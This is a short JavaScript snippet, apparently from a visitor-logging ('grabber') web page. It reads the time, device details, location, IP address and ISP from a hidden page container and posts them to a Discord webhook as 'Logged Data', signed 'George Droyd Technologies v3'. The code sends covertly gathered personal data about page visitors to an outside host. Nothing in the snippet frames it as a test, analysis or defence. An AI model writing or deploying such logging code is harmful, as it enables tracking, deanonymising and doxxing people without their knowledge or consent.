let sendToDiscordTimeout;
let lastSentTime = 0;
const RATE_LIMIT_DELAY = 1000;

async function sendToDiscord() {
  const webhookUrl = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token";

  const hiddenContainer = document.getElementById("hiddencontainer");
  if (!hiddenContainer) return;

  const currentTime = Date.now();
  if (currentTime - lastSentTime < RATE_LIMIT_DELAY) return;
  lastSentTime = currentTime;

  const contentArray = [];
  const ids = ["time", "device-info", "location", "ip-address", "isp"];

  ids.forEach(id => {
    const element = document.getElementById(id);
    if (element) {
      const text = element.innerText.trim();
      if (text) {
        contentArray.push(text);
      } else {
        contentArray.push("N/A");
      }
    } else {
      contentArray.push("N/A");
    }
  });

  const embed = {
    title: "**Logged Data**",
    color: 0x2ecc71,
    fields: [
      { name: "Time Information", value: contentArray[0] || "N/A", inline: false },
      { name: "Device Information", value: contentArray[1] || "N/A", inline: false },
      { name: "Location Information", value: contentArray[2] || "Unknown", inline: false },
      { name: "IP Address", value: contentArray[3] || "N/A", inline: true },
      { name: "ISP Information", value: contentArray[4] || "N/A", inline: true },
    ],
    footer: { text: "Logged by George Droyd Technologies v3" },
    timestamp: new Date(),
  };

  const payload = {
    embeds: [embed]
  };

  try {
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      console.error("Failed to send webhook:", response.statusText);
    }
  } catch (error) {
    console.error("Error sending webhook:", error);
  }
}
